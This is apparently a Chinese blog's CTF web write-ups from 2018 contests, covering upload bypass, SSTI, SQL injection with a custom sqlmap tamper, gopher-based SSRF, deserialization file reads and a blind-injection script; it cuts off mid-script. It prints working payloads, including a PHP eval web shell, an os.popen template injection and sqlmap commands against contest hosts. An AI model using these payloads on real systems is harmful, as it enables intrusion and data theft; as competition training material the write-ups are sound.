class="headerlink" title="参考"></a>参考</h3><p>1.这篇文章是从payload出发来分析触发点的，很具有借鉴意义–&gt;<br><a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="external">CVE-2018-14421——Seacms后台getshell分析</a></p><p>文章中提到一点</p><blockquote><p>htm文件在开发中就只是模板文件，需要有控制器来渲染，渲染一般都是有include，render，render_template等等代码关键词，所以我们可以通过这个来确定控制器。</p></blockquote><p>2.<a href="https://www.anquanke.com/post/id/153402" target="_blank" rel="external">seacms v6.61 审计深入思考</a></p><h2 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10031/index.php" target="_blank" rel="external">http://101.71.29.5:10031/index.php</a></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>1.上传php文件–&gt;上传失败并提示It is not a image</p><p>2.burp抓包并修改Content-Type: image/jpeg和文件后缀名–&gt;依旧上传失败</p><p>3.猜测可能是判断了文件的格式，比如文件头什么的，所以我在图片里藏了一段PHP代码进行上传–&gt;成功上传，但是无法解析</p><p>4.目标是Apache机器，进而构造<code>mu.jpg.php</code>后缀名进行上传–&gt;上传成功并且成功解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @eval($_POST[&apos;pass&apos;]) ?&gt;</div></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" alt="屏幕快照 2018-11-23 下午1.52.01.png"></a></p><p>5.使用cknife进行连接并找到flag<br><a href="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" alt="屏幕快照 2018-11-23 下午1.51.46.png"></a></p><h2 id="0x03-高级渗透测试"><a href="#0x03-高级渗透测试" class="headerlink" title="0x03 高级渗透测试"></a>0x03 高级渗透测试</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10050/" target="_blank" rel="external">http://101.71.29.5:10050/</a></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析:"></a>题目分析:</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>2018-湖湘杯-Web</title>
      <link href="/2018/11/19/2018-hxb-Web-writeup/"/>
      <url>/2018/11/19/2018-hxb-Web-writeup/</url>
      <content type="html"><![CDATA[<h2 id="WEB-XmeO"><a href="#WEB-XmeO" class="headerlink" title="WEB  XmeO"></a>WEB  XmeO</h2><p>题目解析:</p><p>是一个ssti类型漏洞</p><p>playload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].popen(<span class="string">'ls'</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>参考:</p><p>之前一直也是被搅屎，后来下线了没管，结果最后5分钟他又上线了。。。5分钟里还挂了3分钟，没翻到flag，打扰了。</p><p><a href="https://www.jianshu.com/p/6e4aebd18660" target="_blank" rel="external">https://www.jianshu.com/p/6e4aebd18660</a></p><p><a href="http://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="external">http://www.cnblogs.com/tyomcat/p/5440488.html</a></p><p><a href="https://www.freebuf.com/articles/web/133336.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/133336.html</a></p><h2 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB  Code Check"></a>WEB  Code Check</h2><p>题目解析:</p><p>目录遍历得到源码(我说我之前是百度+猜解得到加解密算法的你敢信)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.108.176.234:49882/news/</div></pre></td></tr></table></figure></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header('content-type:text/html;charset=utf-8');</div><div class="line">require_once '../config.php';</div><div class="line">//解密过程</div><div class="line">function decode($data)&#123;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');</div><div class="line">mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line">if(substr(trim($data),-7)!=='hxb2018')&#123;</div><div class="line">echo '&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;';</div><div class="line">&#125;else&#123;</div><div class="line">return substr(trim($data),0,strlen(trim($data))-7);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$id=decode($_GET['id']);</div><div class="line">$sql="select id,title,content,time from notice where id=$id";</div><div class="line">$info=$link-&gt;query($sql);</div><div class="line">$arr=$info-&gt;fetch_assoc();</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang="en"&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset="UTF-8"&gt;</div><div class="line">&lt;title&gt;X公司HR系统V1.0&lt;/title&gt;</div><div class="line">&lt;style&gt;.body&#123;width:600px;height:500px;margin:0 auto&#125;.title&#123;color:red;height:60px;line-height:60px;font-size:30px;font-weight:700;margin-top:75pt;border-bottom:2px solid red;text-align:center&#125;.content,.title&#123;margin:0 auto;width:600px;display:block&#125;.content&#123;height:30px;line-height:30px;font-size:18px;margin-top:40px;text-align:left;color:#828282&#125;&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="body"&gt;</div><div class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</div><div class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p>使用<code>dirsearch</code>扫描还发现了phpinfo页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.108.176.234:49882/0.php</div></pre></td></tr></table></figure></p><p>依据解密过程写出加密过程<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// header('content-type:text/html;charset=utf-8');</span></div><div class="line"><span class="comment">// require_once '../config.php';</span></div><div class="line"><span class="comment">//解密过程</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</div><div class="line">    mcrypt_generic_init($td, <span class="string">'ydhaqPQnexoaDuW3'</span>, <span class="string">'2018201920202021'</span>);</div><div class="line">    $data = mdecrypt_generic($td, base64_decode(base64_decode($data)));</div><div class="line">    mcrypt_generic_deinit($td);</div><div class="line">    mcrypt_module_close($td);</div><div class="line">    <span class="keyword">if</span> (substr(trim($data), <span class="number">-7</span>) !== <span class="string">'hxb2018'</span>) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="comment">//        var_dump($data);</span></div><div class="line">        <span class="keyword">return</span> substr(trim($data), <span class="number">0</span>, strlen(trim($data)) - <span class="number">7</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">    mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">    $data = mcrypt_generic($td,$data);</div><div class="line">    mcrypt_generic_deinit($td);</div><div class="line">    mcrypt_module_close($td);</div><div class="line">    $data = base64_encode(base64_encode($data));</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line">$id = decode(<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>);</div><div class="line"><span class="comment">//echo $id;</span></div><div class="line"></div><div class="line"><span class="comment">//$deid=encode("2hxb2018");</span></div><div class="line">$enid=$_GET[<span class="string">'enid'</span>].<span class="string">"hxb2018"</span>;</div><div class="line">$deid=encode($enid);</div><div class="line"><span class="comment">//$id = decode($deid);</span></div><div class="line"><span class="keyword">echo</span> $deid;</div></pre></td></tr></table></figure></p><p>我将加密算法放在了本地服务器上然后写了一个sqlmap的tamper去进行注入。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</div><div class="line">See the file 'doc/COPYING' for copying permission</div><div class="line">"""</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</div><div class="line"></div><div class="line">__priority__ = PRIORITY.LOWEST</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> payload:</div><div class="line">        enurl=<span class="string">"http://localhost/footest/test.php?enid=&#123;&#125;"</span>.format(payload)</div><div class="line">        enpayload=requests.get(enurl)</div><div class="line">        <span class="keyword">return</span> enpayload.content</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        payload</div></pre></td></tr></table></figure></p><p>payload如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u<span class="string">"http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span> --tamper 23333 -D <span class="string">"mozhe_discuz_stormgroup"</span> -T <span class="string">"notice2"</span> -C <span class="string">"title"</span> --dump</div></pre></td></tr></table></figure></p><p>注入得到的数据如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Database: mozhe_discuz_stormgroup</div><div class="line">Table: notice2</div><div class="line">[1 entry]</div><div class="line">+-------------------------------------------+</div><div class="line">| title                                     |</div><div class="line">+-------------------------------------------+</div><div class="line">| hxb2018&#123;14ef3bd9a833a50b7ae24bbb0e4d57c8&#125; |</div><div class="line">+-------------------------------------------+</div></pre></td></tr></table></figure></p><p>参考:</p><p>就是依据这个链接猜到源码的大概</p><p><a href="http://cpsliang.com/archives/634" target="_blank" rel="external">http://cpsliang.com/archives/634</a></p><h2 id="WEB-Readflag"><a href="#WEB-Readflag" class="headerlink" title="WEB  Readflag"></a>WEB  Readflag</h2><p>题目描述:</p><p>来骗我的flag呀~</p><p>47.107.145.220:80</p><p>解题分析:</p><p>burp的intrude fuzz常见配置文件路径，得到配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url=file:///etc/apache2/sites-enabled/000-default.conf</div></pre></td></tr></table></figure></p><p>从配置文件中读到web路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line"># The ServerName directive sets the request scheme, hostname and port that</div><div class="line"># the server uses to identify itself. This is used when creating</div><div class="line"># redirection URLs. In the context of virtual hosts, the ServerName</div><div class="line"># specifies what hostname must appear in the request&apos;s Host: header to</div><div class="line"># match this virtual host. For the default virtual host (this file) this</div><div class="line"># value is not decisive as it is used as a last resort host regardless.</div><div class="line"># However, you must set it for any further virtual host explicitly.</div><div class="line">#ServerName www.example.com</div><div class="line"></div><div class="line">ServerAdmin webmaster@localhost</div><div class="line">DocumentRoot /var/www/html/ssrf/web.php</div><div class="line"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</div><div class="line"># error, crit, alert, emerg.</div><div class="line"># It is also possible to configure the loglevel for particular</div><div class="line"># modules, e.g.</div><div class="line">#LogLevel info ssl:warn</div><div class="line"></div><div class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</div><div class="line">CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</div><div class="line"></div><div class="line"># For most configuration files from conf-available/, which are</div><div class="line"># enabled or disabled at a global level, it is possible to</div><div class="line"># include a line for only one particular virtual host. For example the</div><div class="line"># following line enables the CGI configuration for this host only</div><div class="line"># after it has been globally disabled with &quot;a2disconf&quot;.</div><div class="line">#Include conf-available/serve-cgi-bin.conf</div><div class="line">&lt;/VirtualHost&gt;</div><div class="line"></div><div class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</div></pre></td></tr></table></figure></p><p>依据找到的web路径去读取源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.107.145.220/?url=file:///var/www/html/ssrf/web.php</div></pre></td></tr></table></figure></p><p>依据源码构造gopher去post数据进而得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"ssrf me with parameter 'url'"</span>;</div><div class="line">&#125;</div><div class="line">$ch = curl_init(); </div><div class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </div><div class="line"><span class="comment">//echo $_GET['url'];</span></div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></div><div class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line"><span class="keyword">echo</span> curl_exec($ch); </div><div class="line">curl_close($ch); </div><div class="line"></div><div class="line"><span class="comment">//var_dump($_POST);</span></div><div class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))&#123;</div><div class="line">  <span class="keyword">if</span>($_POST[<span class="string">'user'</span>]==<span class="string">"admin"</span> &amp;&amp; $ip==<span class="string">"127.0.0.1"</span>)&#123;</div><div class="line">    system(<span class="string">"/var/www/html/ssrf/readflag"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>最后的payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET /?url=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%2f%5f%50%4f%53%54%20%2f%73%73%72%66%2f%77%65%62%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%25%30%64%25%30%61%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%36%25%30%64%25%30%61%55%73%65%72%2d%41%67%65%6e%74%3a%20%63%75%72%6c%2f%37%2e%31%31%2e%30%25%30%64%25%30%61%41%63%63%65%70%74%3a%20%2a%2f%2a%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%31%30%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%64%25%30%61%25%30%64%25%30%61%75%73%65%72%3d%61%64%6d%69%6e HTTP/1.1</div><div class="line">Host: 47.107.238.3</div><div class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p><p>参考:</p><p>做题时看到的比较有意思的一篇文章，在没有得到源码前我以为题目的逻辑是这样的，因为之前我探测得到MySQL服务是存在的，但后来发现我猜错了。</p><p><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="external">Gopher 协议 ssrf MYSQL 研究</a></p><h2 id="WEB-MyNote"><a href="#WEB-MyNote" class="headerlink" title="WEB  MyNote"></a>WEB  MyNote</h2><p>题目分析:</p><p>首先找到了robots.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">robots.txt</div></pre></td></tr></table></figure></p><p>看到内容里面包含了几个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Allow: /controllers/Basecontrol.php</div><div class="line">Allow: /controllers/Controllers.php</div><div class="line">Allow: /controllers/User.php</div><div class="line">Allow: /flag.php</div></pre></td></tr></table></figure></p><p>之后base64解码查看图片界面的返回信息发现是反序列化信息，进而构造如下数据去读取flag.php文件，最终得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$b[] = <span class="string">'../../flag.php'</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($b)));</div></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php/picture HTTP/1.1</div><div class="line">Host: 47.107.239.135</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30%3D; PHPSESSID=a966des9csihs3pdc7plieldsh</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p><p>题目下线太快了，忘记保存flag的响应包了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p><p>参考:</p><p>这题目可以getshell，所以一直被搅屎，而且存在原题。。。</p><p><a href="https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/" target="_blank" rel="external">https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>2018 EIS Web writeup</title>
      <link href="/2018/11/17/2018-EIS-Web-writeup/"/>
      <url>/2018/11/17/2018-EIS-Web-writeup/</url>
      <content type="html"><![CDATA[<h2 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleBBS</p><p><a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="external">http://bbs.sec.zju.edu.cn/</a></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>1.登录处报错<br><a href="https://i.loli.net/2018/11/16/5beede7d12704.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/16/5beede7d12704.png" alt="屏幕快照 2018-11-16 下午11.12.39.png"></a><br>2.导出burp的包使用sqlmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r bbs.txt --dbs</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">available databases [2]:</div><div class="line">[*] bbs</div><div class="line">[*] information_schema</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; --tables</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Database: bbs</div><div class="line">[7 tables]</div><div class="line">+----------+</div><div class="line">| admin    |</div><div class="line">| articles |</div><div class="line">| comments |</div><div class="line">| flag     |</div><div class="line">| messages |</div><div class="line">| sections |</div><div class="line">| users    |</div><div class="line">+----------+</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; --tables</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Database: bbs</div><div class="line">[7 tables]</div><div class="line">+----------+</div><div class="line">| admin    |</div><div class="line">| articles |</div><div class="line">| comments |</div><div class="line">| flag     |</div><div class="line">| messages |</div><div class="line">| sections |</div><div class="line">| users    |</div><div class="line">+----------+</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r bbs.txt -D &quot;bbs&quot; -T &quot;flag&quot; -C &quot;f&quot; --dump</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># 测试的时候已经没有flag了....</div><div class="line">Database: bbs</div><div class="line">Table: flag</div><div class="line">[1 entry]</div><div class="line">+---------+</div><div class="line">| f       |</div><div class="line">+---------+</div><div class="line">| &lt;blank&gt; |</div><div class="line">+---------+</div></pre></td></tr></table></figure><h2 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>SimpleBlog</p><p><a href="http://210.32.4.20/" target="_blank" rel="external">http://210.32.4.20/</a></p><h3 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析:"></a>题目解析:</h3><p>刚开始一直再找文件包含想看下源码，后来是在找不到就认真做了下题目。发现直接二次注入就好了，如果注入内容存在后面做题的分数会为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line">register = <span class="string">'http://210.32.4.20/register.php'</span></div><div class="line">login = <span class="string">'http://210.32.4.20/login.php'</span></div><div class="line">answer = <span class="string">'http://210.32.4.20/answer.php'</span></div><div class="line">logout = <span class="string">'http://210.32.4.20/logout.php'</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">50</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"i:"</span>,chr(i),<span class="string">"j"</span>,chr(j)</div><div class="line">        req = requests.session()</div><div class="line">        payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"),1,0)='1' or \'"</span></div><div class="line">        post_answer = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</div><div class="line">        login_data = &#123;<span class="string">'username'</span>:urllib.quote(payload),<span class="string">'password'</span>:<span class="string">'zeroyu'</span>&#125;</div><div class="line">        r = req.post(register,data=login_data)</div><div class="line">        lin = req.post(login,data=login_data)</div><div class="line">        ans = req.post(answer,data=post_answer) </div><div class="line">        </div><div class="line">        <span class="keyword">if</span> <span 